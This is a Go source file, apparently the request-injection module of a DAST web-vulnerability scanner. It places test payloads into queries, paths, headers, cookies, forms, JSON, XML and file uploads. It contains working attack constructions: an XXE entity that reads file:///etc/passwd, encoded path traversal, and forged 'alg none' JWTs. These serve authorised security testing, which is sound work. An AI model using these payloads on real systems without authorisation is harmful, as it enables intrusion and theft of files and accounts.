package injectors

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"mime/multipart"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"

	"github.com/shingeki/dast-worker/internal/attack/types"
	"github.com/shingeki/dast-worker/pkg/targeturl"
)

type RequestSpec struct {
	Method  string
	URL     string
	Headers map[string]string
	Body    string
}

func BuildBaseline(job types.Job) (RequestSpec, error) {
	return build(job, false)
}

func BuildAttack(job types.Job) (RequestSpec, error) {
	return build(job, true)
}

// BuildUnauthenticated is the same request with credentials removed.
// JWT confusion is only meaningful when this request is rejected.
func BuildUnauthenticated(job types.Job) (RequestSpec, error) {
	spec, err := build(job, false)
	if err != nil {
		return RequestSpec{}, err
	}
	for key := range spec.Headers {
		if strings.EqualFold(key, "Authorization") || strings.EqualFold(key, "Cookie") {
			delete(spec.Headers, key)
		}
	}
	return spec, nil
}

func build(job types.Job, inject bool) (RequestSpec, error) {
	location := job.Attack.TargetLocation
	if location == "" {
		location = job.Vector.TargetLocation
	}

	switch location {
	case "QUERY_PARAMETER":
		return buildQuery(job, inject)
	case "URL_PATH":
		return buildPath(job, inject)
	case "HEADER":
		return buildHeader(job, inject)
	case "COOKIE":
		return buildCookie(job, inject)
	case "FORM":
		return buildForm(job, inject)
	case "JSON_BODY", "API_ENDPOINT":
		return buildJSON(job, inject)
	case "XML_BODY":
		return buildXML(job, inject)
	case "FILE_UPLOAD":
		return buildMultipart(job, inject)
	case "BROWSER":
		return buildBrowser(job)
	default:
		return buildQuery(job, inject)
	}
}

// buildBrowser fetches the page unchanged. The DOM harness applies the payload
// in the browser, because hash, cookie, storage and postMessage never reach the server.
func buildBrowser(job types.Job) (RequestSpec, error) {
	return RequestSpec{
		Method:  firstNonEmpty(job.Vector.Method, http.MethodGet),
		URL:     job.Vector.Route,
		Headers: cloneHeaders(job.Vector.Headers),
	}, nil
}

func buildQuery(job types.Job, inject bool) (RequestSpec, error) {
	parsed, err := url.Parse(job.Vector.Route)
	if err != nil {
		return RequestSpec{}, err
	}

	useFragment := targeturl.UsesFragmentQuery(parsed)
	values := parsed.Query()
	fragPath := parsed.Fragment
	if useFragment {
		path, fragQuery, _ := targeturl.SplitFragment(parsed.Fragment)
		fragPath = path
		values = fragQuery
	}
	if values == nil {
		values = url.Values{}
	}

	for key, val := range job.Vector.Params {
		values.Set(key, val)
	}
	if inject {
		if key := injectKey(job, firstQueryKey(values)); key != "" {
			values.Set(key, job.Payload.Value)
		}
	}

	if useFragment {
		parsed.RawQuery = ""
		parsed.Fragment = ""
		parsed.RawFragment = ""
		origin := targeturl.Origin(parsed.String())
		path := fragPath
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}
		urlStr := strings.TrimRight(origin, "/") + "/#" + path
		if encoded := values.Encode(); encoded != "" {
			urlStr += "?" + encoded
		}
		return RequestSpec{
			Method:  firstNonEmpty(job.Vector.Method, http.MethodGet),
			URL:     urlStr,
			Headers: cloneHeaders(job.Vector.Headers),
		}, nil
	}

	parsed.RawQuery = values.Encode()
	return RequestSpec{
		Method:  firstNonEmpty(job.Vector.Method, http.MethodGet),
		URL:     parsed.String(),
		Headers: cloneHeaders(job.Vector.Headers),
	}, nil
}

func buildPath(job types.Job, inject bool) (RequestSpec, error) {
	parsed, err := url.Parse(job.Vector.Route)
	if err != nil {
		return RequestSpec{}, err
	}
	if inject {
		segment := job.Payload.Value
		if segment == "" {
			segment = job.Payload.Field
		}
		if segment != "" {
			applyPathPayload(parsed, segment)
		}
	}
	return RequestSpec{
		Method:  firstNonEmpty(job.Vector.Method, http.MethodGet),
		URL:     parsed.String(),
		Headers: cloneHeaders(job.Vector.Headers),
	}, nil
}

func applyPathPayload(u *url.URL, payload string) {
	encoded := encodeDotDotSegments(payload)
	escaped := u.EscapedPath()
	if escaped == "" {
		escaped = "/"
	}
	prefix := escaped
	if !strings.HasSuffix(escaped, "/") {
		idx := strings.LastIndex(escaped, "/")
		if idx >= 0 {
			prefix = escaped[:idx+1]
		} else {
			prefix = "/"
		}
	}
	raw := prefix + encoded
	unescaped, err := url.PathUnescape(raw)
	if err != nil {
		unescaped = strings.ReplaceAll(strings.ReplaceAll(raw, "%2e", "."), "%2E", ".")
	}
	u.Path = unescaped
	u.RawPath = raw
}

func encodeDotDotSegments(payload string) string {
	payload = strings.ReplaceAll(payload, `\`, "/")
	payload = strings.ReplaceAll(payload, "..", "%2e%2e")
	return strings.ReplaceAll(payload, "/", "%2f")
}

func buildHeader(job types.Job, inject bool) (RequestSpec, error) {
	headers := cloneHeaders(job.Vector.Headers)
	if isJWTConfusion(job) {
		token := bearerToken(headers)
		if inject {
			headers["Authorization"] = "Bearer " + noneJWT(token, job.Payload.Value)
		} else if token != "" {
			headers["Authorization"] = "Bearer " + brokenJWT(token)
		}
		return RequestSpec{
			Method:  firstNonEmpty(job.Vector.Method, http.MethodGet),
			URL:     job.Vector.Route,
			Headers: headers,
		}, nil
	}
	if inject {
		name := injectKey(job, "X-Forwarded-For")
		headers[name] = job.Payload.Value
	}
	return RequestSpec{
		Method:  firstNonEmpty(job.Vector.Method, http.MethodGet),
		URL:     job.Vector.Route,
		Headers: headers,
	}, nil
}

func buildCookie(job types.Job, inject bool) (RequestSpec, error) {
	headers := cloneHeaders(job.Vector.Headers)
	if inject {
		name := injectKey(job, "session")
		headers["Cookie"] = setCookiePair(headers["Cookie"], name, job.Payload.Value)
	}
	return RequestSpec{
		Method:  firstNonEmpty(job.Vector.Method, http.MethodGet),
		URL:     job.Vector.Route,
		Headers: headers,
	}, nil
}

func buildForm(job types.Job, inject bool) (RequestSpec, error) {
	values := url.Values{}
	for key, val := range job.Vector.Params {
		values.Set(key, val)
	}
	if inject {
		if key := injectKey(job, firstQueryKey(values)); key != "" {
			values.Set(key, job.Payload.Value)
		}
	}
	method := firstNonEmpty(job.Vector.Method, http.MethodPost)
	headers := cloneHeaders(job.Vector.Headers)
	if headers["Content-Type"] == "" {
		headers["Content-Type"] = "application/x-www-form-urlencoded"
	}
	return RequestSpec{
		Method:  method,
		URL:     job.Vector.Route,
		Headers: headers,
		Body:    values.Encode(),
	}, nil
}

func buildJSON(job types.Job, inject bool) (RequestSpec, error) {
	payload := map[string]any{}
	if job.Vector.Body != "" {
		if err := json.Unmarshal([]byte(job.Vector.Body), &payload); err != nil {
			// Recorded bodies are sometimes XML or form data mislabeled as JSON.
			// Drop the template and probe the discovered fields instead of failing the job.
			payload = map[string]any{}
		}
	}
	for key, val := range job.Vector.Params {
		payload[key] = val
	}
	if inject {
		key := injectKey(job, "input")
		payload[key] = job.Payload.Value
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return RequestSpec{}, fmt.Errorf("marshal json body: %w", err)
	}
	method := firstNonEmpty(job.Vector.Method, http.MethodPost)
	headers := cloneHeaders(job.Vector.Headers)
	if headers["Content-Type"] == "" {
		headers["Content-Type"] = "application/json"
	}
	return RequestSpec{
		Method:  method,
		URL:     job.Vector.Route,
		Headers: headers,
		Body:    string(body),
	}, nil
}

func buildMultipart(job types.Job, inject bool) (RequestSpec, error) {
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)
	for key, val := range job.Vector.Params {
		if key == "" {
			continue
		}
		if err := writer.WriteField(key, val); err != nil {
			return RequestSpec{}, err
		}
	}
	field := injectKey(job, "file")
	filename := "probe.txt"
	contents := "dast-probe"
	if inject {
		filename = job.Payload.Value
		if filename == "" {
			filename = "probe.txt"
		}
		contents = job.Payload.Value
	}
	part, err := writer.CreateFormFile(field, filename)
	if err != nil {
		return RequestSpec{}, err
	}
	if _, err := part.Write([]byte(contents)); err != nil {
		return RequestSpec{}, err
	}
	if err := writer.Close(); err != nil {
		return RequestSpec{}, err
	}
	headers := cloneHeaders(job.Vector.Headers)
	headers["Content-Type"] = writer.FormDataContentType()
	return RequestSpec{
		Method:  firstNonEmpty(job.Vector.Method, http.MethodPost),
		URL:     job.Vector.Route,
		Headers: headers,
		Body:    buf.String(),
	}, nil
}

var xxeSystemPattern = regexp.MustCompile(`(?i)SYSTEM\s+"([^"]+)"`)

func buildXML(job types.Job, inject bool) (RequestSpec, error) {
	headers := cloneHeaders(job.Vector.Headers)
	headers["Content-Type"] = "application/xml"
	body := job.Payload.Value
	if len(job.Vector.Params) > 0 {
		body = wrapParamsAsXML(job.Vector.Params, job.Payload.Value, inject, injectKey(job, firstParamKey(job.Vector.Params)), job.Vector.XMLRoot)
	}
	return RequestSpec{
		Method:  firstNonEmpty(job.Vector.Method, http.MethodPost),
		URL:     job.Vector.Route,
		Headers: headers,
		Body:    body,
	}, nil
}

func wrapParamsAsXML(params map[string]string, payload string, inject bool, key string, root string) string {
	system := "file:///etc/passwd"
	if match := xxeSystemPattern.FindStringSubmatch(payload); len(match) == 2 && match[1] != "" {
		system = match[1]
	}
	names := make([]string, 0, len(params))
	for name := range params {
		names = append(names, name)
	}
	sort.Strings(names)

	root = xmlName(root)
	if root == "field" {
		root = "data"
	}

	var buf strings.Builder
	if inject {
		buf.WriteString(`<?xml version="1.0"?><!DOCTYPE `)
		buf.WriteString(root)
		buf.WriteString(` [<!ENTITY xxe SYSTEM "`)
		buf.WriteString(xmlEscape(system))
		buf.WriteString(`">]>`)
	} else {
		buf.WriteString(`<?xml version="1.0"?>`)
	}
	buf.WriteString("<")
	buf.WriteString(root)
	buf.WriteString(">")
	for _, name := range names {
		value := params[name]
		if inject && name == key {
			value = "&xxe;"
		} else {
			value = xmlEscape(value)
		}
		buf.WriteString("<")
		buf.WriteString(xmlName(name))
		buf.WriteString(">")
		buf.WriteString(value)
		buf.WriteString("</")
		buf.WriteString(xmlName(name))
		buf.WriteString(">")
	}
	buf.WriteString("</")
	buf.WriteString(root)
	buf.WriteString(">")
	return buf.String()
}

// BuildXMLProbe rebuilds the discovered XML document with one field replaced.
// internalEntity declares that value as an internal entity and references it,
// so a parser that expands entities behaves like the literal value.
func BuildXMLProbe(job types.Job, key, value string, internalEntity bool) (RequestSpec, error) {
	key = strings.TrimSpace(key)
	if key == "" {
		return RequestSpec{}, fmt.Errorf("xml probe key is empty")
	}
	params := cloneParams(job.Vector.Params)
	if params == nil {
		params = map[string]string{}
	}
	job.Vector.Params = params
	job.ParamKey = key
	if internalEntity {
		return buildXMLInternal(job, value)
	}
	params[key] = value
	return buildXML(job, false)
}

func buildXMLInternal(job types.Job, entityValue string) (RequestSpec, error) {
	headers := cloneHeaders(job.Vector.Headers)
	headers["Content-Type"] = "application/xml"
	return RequestSpec{
		Method:  firstNonEmpty(job.Vector.Method, http.MethodPost),
		URL:     job.Vector.Route,
		Headers: headers,
		Body:    wrapInternalEntity(job.Vector.Params, job.ParamKey, entityValue, job.Vector.XMLRoot),
	}, nil
}

func wrapInternalEntity(params map[string]string, key, entityValue, root string) string {
	if _, ok := params[key]; !ok {
		params[key] = ""
	}
	names := make([]string, 0, len(params))
	for name := range params {
		names = append(names, name)
	}
	sort.Strings(names)

	root = xmlName(root)
	if root == "field" {
		root = "data"
	}

	var buf strings.Builder
	buf.WriteString(`<?xml version="1.0"?><!DOCTYPE `)
	buf.WriteString(root)
	buf.WriteString(` [<!ENTITY xxe "`)
	buf.WriteString(xmlEscape(entityValue))
	buf.WriteString(`">]><`)
	buf.WriteString(root)
	buf.WriteString(">")
	for _, name := range names {
		value := xmlEscape(params[name])
		if name == key {
			value = "&xxe;"
		}
		buf.WriteString("<")
		buf.WriteString(xmlName(name))
		buf.WriteString(">")
		buf.WriteString(value)
		buf.WriteString("</")
		buf.WriteString(xmlName(name))
		buf.WriteString(">")
	}
	buf.WriteString("</")
	buf.WriteString(root)
	buf.WriteString(">")
	return buf.String()
}

func cloneParams(params map[string]string) map[string]string {
	if len(params) == 0 {
		return nil
	}
	out := make(map[string]string, len(params))
	for key, value := range params {
		out[key] = value
	}
	return out
}

func xmlEscape(value string) string {
	replacer := strings.NewReplacer(
		"&", "&amp;",
		"<", "&lt;",
		">", "&gt;",
		`"`, "&quot;",
	)
	return replacer.Replace(value)
}

func xmlName(name string) string {
	var buf strings.Builder
	for _, r := range name {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '_' || r == '-' {
			buf.WriteRune(r)
		}
	}
	if buf.Len() == 0 {
		return "field"
	}
	return buf.String()
}

func firstParamKey(params map[string]string) string {
	if len(params) == 0 {
		return ""
	}
	keys := make([]string, 0, len(params))
	for key := range params {
		keys = append(keys, key)
	}
	sort.Strings(keys)
	return keys[0]
}

func injectKey(job types.Job, fallback string) string {
	if job.ParamKey != "" {
		return job.ParamKey
	}
	if job.Payload.Field != "" {
		return job.Payload.Field
	}
	return fallback
}

func firstQueryKey(values url.Values) string {
	if len(values) == 0 {
		return ""
	}
	keys := make([]string, 0, len(values))
	for key := range values {
		keys = append(keys, key)
	}
	sort.Strings(keys)
	return keys[0]
}

func setCookiePair(existing, name, value string) string {
	pair := name + "=" + value
	existing = strings.TrimSpace(existing)
	if existing == "" {
		return pair
	}
	parts := strings.Split(existing, ";")
	replaced := false
	out := make([]string, 0, len(parts)+1)
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		current, _, _ := strings.Cut(part, "=")
		if strings.EqualFold(strings.TrimSpace(current), name) {
			out = append(out, pair)
			replaced = true
			continue
		}
		out = append(out, part)
	}
	if !replaced {
		out = append(out, pair)
	}
	return strings.Join(out, "; ")
}

func cloneHeaders(src map[string]string) map[string]string {
	dst := make(map[string]string, len(src))
	for k, v := range src {
		dst[k] = v
	}
	return dst
}

func firstNonEmpty(values ...string) string {
	for _, v := range values {
		if v != "" {
			return v
		}
	}
	return ""
}

func isJWTConfusion(job types.Job) bool {
	return strings.Contains(strings.ToUpper(job.Attack.Category), "JWT")
}

func bearerToken(headers map[string]string) string {
	for key, value := range headers {
		if !strings.EqualFold(key, "Authorization") {
			continue
		}
		value = strings.TrimSpace(value)
		if strings.HasPrefix(strings.ToLower(value), "bearer ") {
			return strings.TrimSpace(value[7:])
		}
		return value
	}
	return ""
}

func noneJWT(token, alg string) string {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return token
	}
	alg = strings.TrimSpace(alg)
	if alg == "" {
		alg = "none"
	}
	header, _ := json.Marshal(map[string]string{"alg": alg, "typ": "JWT"})
	return base64.RawURLEncoding.EncodeToString(header) + "." + parts[1] + "."
}

func brokenJWT(token string) string {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		if token == "" {
			return "invalid"
		}
		return token + ".invalid"
	}
	return parts[0] + "." + parts[1] + ".invalid-signature"
}
